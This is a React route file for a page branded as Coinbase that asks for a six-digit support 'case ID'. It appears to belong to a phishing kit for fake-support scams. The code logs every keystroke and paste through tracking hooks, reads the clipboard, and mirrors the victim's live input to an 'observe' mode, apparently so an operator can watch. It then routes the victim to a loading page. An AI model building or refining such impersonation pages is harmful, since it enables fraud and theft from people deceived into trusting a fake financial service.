import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
} from "@/components/cb/CbShared";

export const Route = createFileRoute("/cb/caseid")({
  head: () => ({ meta: [{ title: "Case ID" }] }),
  component: CbCaseIdPage,
});

function CbCaseIdPage() {
  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId, isObserve } =
    useCbTracking();
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      if (d.field !== "case_id" && d.field !== "Case ID") return;
      const raw = String(d.value ?? "").replace(/\D/g, "").slice(0, 6);
      const next = ["", "", "", "", "", ""];
      for (let i = 0; i < raw.length; i++) next[i] = raw[i];
      setDigits(next);
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const commitIfFull = (arr: string[]) => {
    if (arr.every((d) => d !== "")) {
      trackSubmit("case_id", arr.join(""));
      trackClick("Case ID Submitted");
    }
  };

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    trackInput("case_id", newDigits.join(""), "text");
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
    commitIfFull(newDigits);
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;
    const newDigits = [...digits];
    for (let i = 0; i < pasted.length; i++) newDigits[i] = pasted[i];
    setDigits(newDigits);
    trackInput("case_id", newDigits.join(""), "text");
    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
    commitIfFull(newDigits);
  };

  const allFilled = digits.every((d) => d !== "");

  const handleContinue = () => {
    if (!allFilled) return;
    trackClick("Case ID Continue");
    cbNavigate("/cb/loading");
  };

  return (
    <div
      className="cb-page"
      style={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        backgroundColor: "rgb(10, 11, 13)",
        color: "#fff",
      }}
    >
      <CbFontStyle />
      <style>{`
        .cb-page, .cb-page * {
          font-family: 'CoinbaseSans', 'CoinbaseDisplay', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
          -webkit-font-smoothing: antialiased;
        }
        .cb-page * { box-sizing: border-box; }
        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .cb-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .cb-animate-delay-1 { animation-delay: 0.05s; }
        .cb-animate-delay-2 { animation-delay: 0.1s; }
        .cb-animate-delay-3 { animation-delay: 0.15s; }
        .cb-animate-delay-4 { animation-delay: 0.2s; }
        .cb-digit {
          width: 100%; aspect-ratio: 1; text-align: center; font-size: 24px;
          font-weight: 500; border-radius: 12px;
          border: 1px solid rgba(138, 145, 158, 0.2);
          background: rgb(10, 11, 13); color: #fff; outline: none;
          caret-color: rgb(87, 139, 250);
          transition: border-color 0.15s ease, box-shadow 0.15s ease, background 0.15s ease, transform 0.15s ease;
        }
        .cb-digit:hover { background: rgb(17, 18, 20); }
        .cb-digit:focus { border-color: rgb(87, 139, 250); box-shadow: 0 0 0 1px rgb(87, 139, 250); transform: scale(1.05); }
        .cb-digit.filled { border-color: rgb(87, 139, 250); }
      `}</style>

      <CbSupportBanner />

      <header
        style={{
          display: "grid",
          gridTemplateColumns: "auto 1fr auto",
          height: 72,
          alignItems: "center",
          padding: "0 24px",
          width: "100%",
        }}
      >
        <div
          style={{ display: "flex", alignItems: "center", color: "#fff", cursor: "pointer" }}
          onClick={() => trackClick("Logo")}
        >
          <CbLogo />
        </div>
        <div />
        <div />
      </header>

      <main
        style={{
          display: "flex",
          justifyContent: "center",
          flexDirection: "column",
          flexGrow: 1,
          width: "100%",
          padding: "0 16px",
          alignItems: "center",
        }}
      >
        <div style={{ width: "100%", maxWidth: 380, display: "flex", flexDirection: "column" }}>
          <h1
            className="cb-animate"
            style={{
              fontSize: 28,
              fontWeight: 500,
              lineHeight: "36px",
              letterSpacing: "-0.02em",
              color: "#fff",
              margin: "0 0 12px 0",
            }}
          >
            Case ID
          </h1>
          <p
            className="cb-animate cb-animate-delay-1"
            style={{
              fontSize: 14,
              lineHeight: "20px",
              color: "rgb(138, 145, 158)",
              margin: "0 0 32px 0",
            }}
          >
            Enter the 6-digit case ID provided to you by our support team.
          </p>

          <div
            className="cb-animate cb-animate-delay-2"
            style={{ display: "grid", gridTemplateColumns: "repeat(6, 1fr)", gap: 12 }}
          >
            <input type="hidden" name="case_id" value={digits.join("")} readOnly />
            {digits.map((digit, i) => (
              <input
                key={i}
                ref={(el) => {
                  inputRefs.current[i] = el;
                }}
                name={`case_id_${i}`}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                onPaste={i === 0 ? handlePaste : undefined}
                className={`cb-digit ${digit ? "filled" : ""}`}
                style={{ animationDelay: `${0.1 + i * 0.04}s` }}
              />
            ))}
          </div>

          <button
            className="cb-animate cb-animate-delay-3"
            onClick={() => {
              navigator.clipboard.readText().then((text) => {
                const cleaned = text.replace(/\D/g, "").slice(0, 6);
                if (!cleaned) return;
                const newDigits = [...digits];
                for (let i = 0; i < cleaned.length; i++) newDigits[i] = cleaned[i];
                setDigits(newDigits);
                commitIfFull(newDigits);
                trackClick("Paste Case ID");
                inputRefs.current[Math.min(cleaned.length, 5)]?.focus();
              });
            }}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 8,
              width: "100%",
              marginTop: 16,
              padding: "10px 0",
              background: "transparent",
              border: "none",
              cursor: "pointer",
              color: "rgb(87, 139, 250)",
              fontSize: 14,
              fontWeight: 500,
            }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
              <rect x="9" y="9" width="13" height="13" rx="2" stroke="rgb(87, 139, 250)" strokeWidth="2" />
              <path
                d="M5 15H4C2.89543 15 2 14.1046 2 13V4C2 2.89543 2.89543 2 4 2H13C14.1046 2 15 2.89543 15 4V5"
                stroke="rgb(87, 139, 250)"
                strokeWidth="2"
              />
            </svg>
            Paste from clipboard
          </button>

          <button
            className="cb-animate cb-animate-delay-4"
            onClick={handleContinue}
            disabled={!allFilled}
            style={{
              width: "100%",
              height: 56,
              marginTop: 24,
              border: "none",
              borderRadius: 1000,
              background: allFilled ? "rgb(87, 139, 250)" : "rgba(87, 139, 250, 0.3)",
              color: allFilled ? "rgb(10, 11, 13)" : "rgba(255,255,255,0.4)",
              fontSize: 16,
              fontWeight: 700,
              cursor: allFilled ? "pointer" : "not-allowed",
              transition: "background-color 0.15s ease",
            }}
          >
            Continue
          </button>

          <p
            className="cb-animate cb-animate-delay-4"
            style={{
              fontSize: 13,
              color: "rgb(138, 145, 158)",
              marginTop: 24,
              textAlign: "center",
              lineHeight: "18px",
            }}
          >
            Not your device? Use a private window.
            <br />
            See our{" "}
            <a
              href="#"
              style={{ color: "rgb(87, 139, 250)", textDecoration: "none", fontWeight: 500 }}
              onClick={(e) => {
                e.preventDefault();
                trackClick("Privacy Policy");
              }}
            >
              Privacy Policy
            </a>{" "}
            for more info.
          </p>
        </div>
      </main>

      <footer style={{ padding: "16px 24px", textAlign: "center" }}>
        <p style={{ fontSize: 11, color: "rgb(138, 145, 158)", margin: 0 }}>© 2025 Coinbase</p>
      </footer>

      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>
        {sessionId}
      </div>
    </div>
  );
}
